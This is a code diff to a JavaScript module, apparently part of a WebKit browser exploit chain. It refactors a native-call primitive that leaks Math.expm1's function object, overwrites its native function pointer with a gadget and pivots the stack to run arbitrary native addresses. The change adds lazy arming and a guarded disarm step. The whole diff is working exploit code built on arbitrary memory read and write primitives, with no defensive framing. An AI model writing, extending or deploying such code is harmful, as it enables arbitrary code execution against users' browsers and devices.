@@ -207,6 +207,13 @@ export function initNativeCall(p, off, opts) {
     const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
     const keepAlive = [];
 
+    let M = null;
+    let mainMf = null;
+    let mainOrig = null;
+    let pivotCell = null;
+    let pivotObj = null;
+    let armed = false;
+
     function makeCtx() {
         const sb = new ArrayBuffer(0x20);
         const pb = new ArrayBuffer(PB_SIZE);
@@ -258,16 +265,22 @@ export function initNativeCall(p, off, opts) {
         put(c.pivotDv, pivotSp, c.K.add32(at));
     }
 
-    const M = makeCtx();
-    const cell = p.leakval(Math.expm1);
-    const mainMf = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
-    const mainOrig = p.read8(mainMf);
-    const pivotObj = {};
-    keepAlive.push(pivotObj);
-    const pivotCell = p.leakval(pivotObj);
-    p.write8(mainMf, G.G0);
+    function arm() {
+        if (armed) return;
+        M = makeCtx();
+        const cell = p.leakval(Math.expm1);
+        mainMf = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
+        mainOrig = p.read8(mainMf);
+        pivotObj = {};
+        keepAlive.push(pivotObj);
+        pivotCell = p.leakval(pivotObj);
+        p.write8(mainMf, G.G0);
+        armed = true;
+        log("NATIVE-ARM", "pivot armed");
+    }
 
     function callAddr(target, args) {
+        arm();
         layout(M, target, args || []);
         const saved = p.read8(pivotCell);
         p.write8(pivotCell, M.S);
@@ -287,8 +300,13 @@ export function initNativeCall(p, off, opts) {
     }
 
     function disarm() {
+        if (!armed) return;
         try { p.write8(mainMf, mainOrig); } catch (_) { }
+        armed = false;
     }
+
+    if (opts.lazyArm !== true)
+        arm();
 
     return {
         webkitBase,
